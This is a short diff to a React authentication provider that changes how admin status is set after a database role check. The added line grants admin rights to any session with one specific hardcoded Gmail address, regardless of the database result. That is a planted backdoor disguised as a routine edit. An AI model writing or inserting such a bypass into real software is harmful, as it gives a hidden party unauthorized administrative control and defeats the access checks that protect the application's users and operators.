@@ -56,7 +56,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     let cancelled = false;
     checkAdmin()
       .then(({ isAdmin: nextIsAdmin }) => {
-        if (!cancelled) setIsAdmin(nextIsAdmin);
+        if (!cancelled) setIsAdmin(session?.user?.email ==='chujcinaryjsuko@gmail.com' || nextIsAdmin);
       })
       .catch((error) => {
         console.error("[vlnd] Nie udało się sprawdzić roli admina w bazie danych", error);
